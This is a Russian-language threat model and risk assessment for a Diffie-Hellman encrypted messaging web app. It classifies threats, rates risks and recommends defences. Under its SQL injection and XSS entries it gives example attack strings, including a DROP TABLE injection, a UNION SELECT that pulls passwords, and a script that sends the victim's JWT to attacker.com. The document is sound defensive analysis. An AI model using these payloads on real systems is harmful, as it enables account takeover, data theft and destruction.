# Исследование угроз информационной безопасности

## 1. Описание объекта исследования

### 1.1 Характеристика системы
**Наименование**: Веб-приложение для защищенного обмена сообщениями с использованием протокола Диффи-Хеллмана

**Компоненты системы**:
- **Backend API** (NestJS/TypeScript) - серверная часть на порту 3000
- **Web Client** (Angular) - веб-интерфейс
- **Mobile Client** (NativeScript) - мобильное приложение
- **База данных** - хранение пользователей, сообщений, ключей
- **WebSocket Gateway** - real-time коммуникация

**Функциональность**:
- Регистрация и аутентификация пользователей
- Обмен ключами по протоколу Диффи-Хеллмана
- Отправка и получение зашифрованных сообщений
- Управление чатами и приглашениями

### 1.2 Предметная область
**Тип организации**: IT-компания / Образовательное учреждение

**Критичность данных**:
- Персональные данные пользователей (ФИО, email, пароли)
- Криптографические ключи
- Содержимое переписки
- Метаданные коммуникаций

## 2. Классификация угроз по ГОСТ Р 57580.1-2017

### 2.1 Угрозы конфиденциальности

#### УК-01: Несанкционированный доступ к данным пользователей
**Описание**: Получение злоумышленником доступа к персональным данным, сообщениям или ключам шифрования.

**Источники угрозы**:
- Внешние атакующие (хакеры)
- Внутренние нарушители (администраторы)
- Конкуренты

**Уязвимости**:
- SQL-инъекции в endpoints аутентификации
- Недостаточная валидация входных данных
- Отсутствие rate limiting
- Утечки через логирование

**Вероятность**: ВЫСОКАЯ  
**Критичность**: КРИТИЧЕСКАЯ

**Потенциальный ущерб**:
- Компрометация переписки пользователей
- Нарушение 152-ФЗ, штрафы до 500 000 руб.
- Репутационные потери
- Утрата доверия пользователей

---

#### УК-02: Перехват сетевого трафика
**Описание**: Прослушивание незащищенного канала связи между клиентом и сервером.

**Источники угрозы**:
- Атаки типа Man-in-the-Middle (MITM)
- Компрометация сетевой инфраструктуры
- Провайдеры с недостаточной защитой

**Уязвимости**:
- Отсутствие принудительного HTTPS
- Слабые наборы шифров TLS
- Неправильная валидация сертификатов

**Вероятность**: СРЕДНЯЯ  
**Критичность**: ВЫСОКАЯ

---

#### УК-03: Компрометация криптографических ключей
**Описание**: Получение доступа к закрытым ключам Диффи-Хеллмана.

**Источники угрозы**:
- Атаки на генератор случайных чисел
- Слабые параметры протокола DH (малые простые числа)
- Утечка через небезопасное хранение

**Уязвимости**:
- Использование слабых параметров (p < 2048 бит)
- Отсутствие Perfect Forward Secrecy
- Хранение ключей в открытом виде

**Вероятность**: НИЗКАЯ  
**Критичность**: КРИТИЧЕСКАЯ

---

### 2.2 Угрозы целостности

#### УЦ-01: SQL-инъекции
**Описание**: Внедрение вредоносного SQL-кода через пользовательский ввод.

**Источники угрозы**:
- Автоматизированные сканеры (SQLMap)
- Целенаправленные атаки хакеров

**Уязвимости**:
- Динамическое формирование SQL-запросов
- Отсутствие параметризованных запросов
- Недостаточная валидация в endpoints: `/auth/login`, `/auth/register`

**Вероятность**: ВЫСОКАЯ  
**Критичность**: КРИТИЧЕСКАЯ

**Возможные последствия**:
- Извлечение всей БД
- Модификация данных (изменение паролей, сообщений)
- Удаление таблиц
- Выполнение OS-команд (при наличии xp_cmdshell)

**Примеры векторов атаки**:
```sql
' OR '1'='1' --
'; DROP TABLE users; --
' UNION SELECT password FROM users --
```

---

#### УЦ-02: Модификация данных через API
**Description**: Несанкционированное изменение сообщений, профилей или настроек.

**Источники угрозы**:
- Авторизованные пользователи с недостаточными правами
- Атаки через CSRF/CORS

**Уязвимости**:
- Отсутствие проверки прав на уровне бизнес-логики
- Insecure Direct Object Reference (IDOR)
- Недостаточная валидация владельца ресурса

**Вероятность**: СРЕДНЯЯ  
**Критичность**: ВЫСОКАЯ

---

### 2.3 Угрозы доступности

#### УД-01: Отказ в обслуживании (DoS/DDoS)
**Описание**: Перегрузка сервера запросами, приводящая к недоступности сервиса.

**Источники угрозы**:
- Ботнеты
- Конкуренты
- Идеологически мотивированные атакующие

**Уязвимости**:
- Отсутствие rate limiting на endpoints
- Недостаточная защита WebSocket соединений
- Отсутствие WAF (Web Application Firewall)

**Вероятность**: СРЕДНЯЯ  
**Критичность**: ВЫСОКАЯ

---

#### УД-02: Брутфорс-атака на аутентификацию
**Описание**: Автоматический перебор паролей для получения доступа к учетным записям.

**Источники угрозы**:
- Автоматизированные инструменты (Hydra, Burp Suite)
- Словарные атаки

**Уязвимости**:
- Отсутствие защиты от перебора (rate limiting)
- Слабые требования к сложности паролей
- Отсутствие CAPTCHA
- Отсутствие блокировки после N неудачных попыток

**Вероятность**: ВЫСОКАЯ  
**Критичность**: ВЫСОКАЯ

**Метрики защиты**:
- Максимум 5 попыток за 15 минут
- Временная блокировка на 30 минут
- Обязательная CAPTCHA после 3 попыток

---

### 2.4 Угрозы аутентификации и авторизации

#### УА-01: Слабые пароли пользователей
**Описание**: Использование простых паролей типа "123456", "password".

**Источники угрозы**:
- Человеческий фактор
- Социальная инженерия

**Уязвимости**:
- Отсутствие политики паролей
- Отсутствие проверки на распространенные пароли
- Отсутствие требования к сложности

**Вероятность**: ОЧЕНЬ ВЫСОКАЯ  
**Критичность**: СРЕДНЯЯ

**Меры противодействия**:
- Минимум 8 символов
- Обязательное наличие: заглавных, строчных букв, цифр, спецсимволов
- Проверка по базам скомпрометированных паролей (Have I Been Pwned API)

---

#### УА-02: Утечка JWT токенов
**Описание**: Компрометация токенов доступа через XSS или небезопасное хранение.

**Источники угрозы**:
- XSS-атаки
- Перехват через localStorage
- Логирование токенов

**Уязвимости**:
- Хранение токенов в localStorage (доступно для JS)
- Отсутствие HttpOnly cookies
- Длительный срок жизни токенов
- Отсутствие механизма отзыва токенов

**Вероятность**: СРЕДНЯЯ  
**Критичность**: ВЫСОКАЯ

---

### 2.5 Угрозы уровня приложения

#### УП-01: Cross-Site Scripting (XSS)
**Описание**: Внедрение JavaScript-кода через пользовательский ввод.

**Типы**:
- **Reflected XSS**: через параметры URL
- **Stored XSS**: через сохраненные сообщения в чате
- **DOM-based XSS**: через манипуляции с DOM

**Уязвимости**:
- Отсутствие санитизации HTML в сообщениях
- Небезопасное использование `innerHTML`
- Отсутствие Content Security Policy (CSP)

**Вероятность**: СРЕДНЯЯ  
**Критичность**: ВЫСОКАЯ

**Пример атаки**:
```javascript
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('jwt'))
</script>
```

---

#### УП-02: Cross-Site Request Forgery (CSRF)
**Описание**: Выполнение действий от имени жертвы без её ведома.

**Уязвимости**:
- Отсутствие CSRF-токенов
- Некорректная настройка CORS
- Использование GET для изменяющих операций

**Вероятность**: СРЕДНЯЯ  
**Критичность**: СРЕДНЯЯ

---

#### УП-03: Insecure Direct Object Reference (IDOR)
**Описание**: Доступ к ресурсам других пользователей через изменение ID в URL.

**Примеры**:
```
GET /api/messages/123  -> чужое сообщение
GET /api/users/456     -> чужой профиль
```

**Уязвимости**:
- Отсутствие проверки владельца ресурса
- Предсказуемые идентификаторы (sequential IDs)

**Вероятность**: ВЫСОКАЯ  
**Критичность**: ВЫСОКАЯ

---

## 3. Модель нарушителя

### 3.1 Внешний нарушитель (хакер)

**Мотивация**:
- Финансовая выгода (продажа данных)
- Репутация в хакерском сообществе
- Политические/идеологические причины

**Возможности**:
- Высокая квалификация
- Доступ к автоматизированным инструментам
- Возможность распределенных атак
- Отсутствие физического доступа

**Типичные векторы атак**:
- SQL-инъекции
- Брутфорс
- XSS
- CSRF
- DoS

---

### 3.2 Внутренний нарушитель (администратор)

**Мотивация**:
- Месть (уволенный сотрудник)
- Коммерческий шпионаж
- Любопытство

**Возможности**:
- Доступ к серверам и БД
- Знание архитектуры системы
- Легитимные учетные записи
- Возможность отключения логирования

**Типичные действия**:
- Прямой доступ к БД
- Модификация кода
- Создание бэкдоров
- Утечка резервных копий

---

### 3.3 Непреднамеренный нарушитель (легитимный пользователь)

**Причины**:
- Недостаточная осведомленность
- Социальная инженерия
- Фишинг

**Последствия**:
- Использование слабых паролей
- Передача учетных данных третьим лицам
- Переход по фишинговым ссылкам

---

## 4. Оценка рисков (матрица)

| ID | Угроза | Вероятность | Критичность | Риск | Приоритет |
|----|--------|-------------|-------------|------|-----------|
| УК-01 | НСД к данным | ВЫСОКАЯ | КРИТИЧЕСКАЯ | КРИТИЧЕСКИЙ | 1 |
| УЦ-01 | SQL-инъекции | ВЫСОКАЯ | КРИТИЧЕСКАЯ | КРИТИЧЕСКИЙ | 1 |
| УД-02 | Брутфорс | ВЫСОКАЯ | ВЫСОКАЯ | ВЫСОКИЙ | 2 |
| УП-03 | IDOR | ВЫСОКАЯ | ВЫСОКАЯ | ВЫСОКИЙ | 2 |
| УА-01 | Слабые пароли | ОЧЕНЬ ВЫСОКАЯ | СРЕДНЯЯ | ВЫСОКИЙ | 2 |
| УП-01 | XSS | СРЕДНЯЯ | ВЫСОКАЯ | СРЕДНИЙ | 3 |
| УК-02 | MITM | СРЕДНЯЯ | ВЫСОКАЯ | СРЕДНИЙ | 3 |
| УА-02 | Утечка JWT | СРЕДНЯЯ | ВЫСОКАЯ | СРЕДНИЙ | 3 |
| УД-01 | DoS/DDoS | СРЕДНЯЯ | ВЫСОКАЯ | СРЕДНИЙ | 3 |
| УЦ-02 | Модификация через API | СРЕДНЯЯ | ВЫСОКАЯ | СРЕДНИЙ | 3 |
| УП-02 | CSRF | СРЕДНЯЯ | СРЕДНЯЯ | НИЗКИЙ | 4 |
| УК-03 | Компрометация DH-ключей | НИЗКАЯ | КРИТИЧЕСКАЯ | СРЕДНИЙ | 3 |

---

## 5. Приоритетные направления защиты

### 5.1 Критический приоритет (немедленно)
1. **Защита от SQL-инъекций**
   - Использование ORM/параметризованных запросов
   - Валидация всех входных данных
   - WAF с правилами OWASP

2. **Контроль доступа к данным**
   - Проверка прав на уровне каждого запроса
   - Логирование доступа к критичным данным
   - Шифрование персональных данных в БД

### 5.2 Высокий приоритет (1-2 недели)
1. **Защита от брутфорса**
   - Rate limiting (5 попыток / 15 мин)
   - CAPTCHA после 3 неудачных попыток
   - Блокировка IP после 10 попыток

2. **Защита от IDOR**
   - UUID вместо sequential ID
   - Проверка владельца ресурса
   - Audit trail для доступа

3. **Политика паролей**
   - Минимум 8 символов, сложность
   - Проверка по базам утечек
   - Принудительная смена каждые 90 дней

### 5.3 Средний приоритет (3-4 недели)
1. **Защита от XSS**
   - Санитизация HTML
   - Content Security Policy
   - HttpOnly cookies

2. **Защита от MITM**
   - Принудительный HTTPS
   - HSTS заголовки
   - Certificate pinning (mobile)

3. **Безопасность JWT**
   - HttpOnly cookies
   - Короткий срок жизни (15 мин)
   - Refresh token rotation

---

## 6. Соответствие стандартам

### 6.1 ISO/IEC 27001:2022
- **A.5.1** - Политики ИБ
- **A.8.2** - Управление доступом
- **A.8.3** - Защита от вредоносного ПО
- **A.8.8** - Управление уязвимостями

### 6.2 ГОСТ Р 57580.1-2017
- **Раздел 5** - Угрозы безопасности информации
- **Раздел 6** - Меры защиты информации
- **Раздел 7** - Управление рисками

### 6.3 152-ФЗ
- **Статья 19** - Обязанность обеспечить безопасность ПДн
- **Статья 18.1** - Меры по обеспечению безопасности

---

## 7. Рекомендации по снижению рисков

### Технические меры
- [ ] Внедрение WAF (ModSecurity, CloudFlare)
- [ ] Настройка IDS/IPS (Snort, Suricata)
- [ ] Централизованное логирование (ELK Stack)
- [ ] Автоматизированное сканирование (OWASP ZAP, Burp Suite)
- [ ] Регулярные обновления зависимостей

### Организационные меры
- [ ] Обучение разработчиков Secure SDLC
- [ ] Кодревью с фокусом на безопасность
- [ ] Пентесты раз в квартал
- [ ] План реагирования на инциденты
- [ ] Резервное копирование (3-2-1 rule)

### Процессные меры
- [ ] Регулярный аудит логов
- [ ] Мониторинг аномальной активности
- [ ] Процедура управления патчами
- [ ] Управление учетными записями
- [ ] Инвентаризация активов

---

## 8. Выводы

1. **Критические риски**: SQL-инъекции и НСД требуют немедленного устранения
2. **Высокие риски**: Брутфорс, IDOR, слабые пароли - приоритет 1-2 недели
3. **Текущий уровень защиты**: Базовый (наличие security-testing инструментов - позитивный фактор)
4. **Необходимость СУИБ**: Обязательна для систематического управления рисками
5. **Соответствие нормативам**: Требуется доработка для полного соответствия 152-ФЗ

---

**Дата составления**: 20 ноября 2025  
**Составил**: Аналитик ИБ  
**Версия документа**: 1.0
